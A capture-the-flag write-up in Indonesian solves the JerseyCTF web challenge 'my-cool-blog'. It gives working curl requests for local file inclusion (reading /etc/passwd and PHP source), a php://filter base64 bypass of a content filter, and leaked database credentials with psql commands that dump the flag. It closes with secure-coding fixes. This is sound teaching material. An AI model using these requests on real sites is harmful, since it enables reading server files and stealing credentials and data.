# Writeup JerseyCTF - Web: my-cool-blog

## Ringkasan
Challenge ini vulnerable ke **Local File Inclusion (LFI)** pada parameter `file` di endpoint:

- `GET /view-post.php?file=...`

Dari LFI, file sensitif `includes/db.inc` sebenarnya diblokir dengan filter sederhana (cek substring `pg_connect`).
Filter itu bisa dibypass dengan wrapper PHP:

- `php://filter/convert.base64-encode/resource=...`

Setelah isi `db.inc` didapat (base64), kredensial PostgreSQL terlihat jelas. Lalu tinggal konek langsung ke database dan baca tabel `flag`.

Flag final:

- `jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}`

## Environment
Dikerjakan dari Linux shell dengan tools bawaan:

- `curl`
- `base64`
- `psql`
- `grep`, `sed`

Tidak pakai writeup eksternal.

## Tahap 1 - Enumerasi awal
Halaman utama menampilkan link post dengan pola:

- `/view-post.php?file=posts/cool-post-1`

Ini indikasi kuat backend mengambil file langsung dari input user.

Uji cepat LFI:

```bash
curl -s 'http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=/etc/passwd'
```

Output menampilkan isi `/etc/passwd` (baris `root:x:0:0:...`) sehingga LFI terkonfirmasi.

## Tahap 2 - Baca source untuk memahami proteksi
Karena LFI valid, langkah berikutnya baca source PHP endpoint:

```bash
curl -s 'http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=/opt/server/view-post.php'
```

Potongan logic penting:

- Kalau filename diawali `includes` -> ditolak.
- File dibaca dengan `file_get_contents($filename)`.
- Jika konten file mengandung string `pg_connect` -> dianggap sensitif dan ditolak.

Artinya: blokirnya **berbasis konten plain text**, bukan akses path yang kuat.

## Tahap 3 - Bypass filter sensitif dengan php://filter
Karena filter mendeteksi substring `pg_connect` di hasil baca file, kita ubah output file jadi base64 dulu pakai wrapper PHP.

Request:

```bash
curl -s 'http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=php://filter/convert.base64-encode/resource=/opt/server/includes/db.inc'
```

Hasilnya string base64 panjang. Decode lokal:

```bash
echo '<base64>' | base64 -d
```

Isi `db.inc` yang ter-decode:

```php
<?php
$db = pg_connect('host=my-cool-blog.aws.jerseyctf.com dbname=blog user=blog_web password=oPPNQ9vkMdAJx')
    or die('Could not connect: ' . pg_last_error());
```

Didapat kredensial database:

- host: `my-cool-blog.aws.jerseyctf.com`
- dbname: `blog`
- user: `blog_web`
- password: `oPPNQ9vkMdAJx`

## Tahap 4 - Akses database dan dump flag
Cek tabel:

```bash
PGPASSWORD='oPPNQ9vkMdAJx' psql -h my-cool-blog.aws.jerseyctf.com -U blog_web -d blog -c '\dt'
```

Terlihat ada tabel `flag` dan `posts`.

Ambil isi tabel flag:

```bash
PGPASSWORD='oPPNQ9vkMdAJx' psql -h my-cool-blog.aws.jerseyctf.com -U blog_web -d blog -c 'SELECT * FROM flag;'
```

Output menghasilkan flag:

- `jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}`

## Kenapa exploit ini berhasil
Akar masalah ada di dua hal:

1. User input dipakai langsung sebagai path `file_get_contents` -> LFI.
2. Proteksi data sensitif hanya cek string (`pg_connect`) setelah file dibaca.

Wrapper `php://filter/convert.base64-encode/resource=...` membuat isi file berubah jadi base64, sehingga string sensitif tidak muncul dalam bentuk literal dan filter gagal mendeteksi.

## Dampak
Dengan kombinasi LFI + filter bypass:

- Source code bisa dieksfiltrasi.
- Secret database bisa bocor.
- Data database (termasuk flag) bisa diambil langsung.

## Rekomendasi perbaikan (untuk konteks secure coding)

- Jangan pernah pakai input user langsung sebagai path file.
- Terapkan whitelist ID konten (misalnya slug -> map ke file tetap di server).
- Simpan kredensial di env var/secret manager, bukan file yang bisa terekspos.
- Matikan error detail di production.
- Validasi ketat scheme stream wrapper (`php://`, `data://`, dll) dan nolkan akses ke wrapper yang tidak perlu.

## Solver otomatis
File solver sudah disiapkan di repo ini:

- `solver.sh`

Jalankan:

```bash
./solver.sh
```

Script melakukan:

1. Validasi LFI dengan `/etc/passwd`.
2. Ambil `db.inc` via `php://filter` base64.
3. Decode + parse kredensial.
4. Query tabel `flag`.
5. Cetak output format CTF `<FLAG>...</FLAG>`.
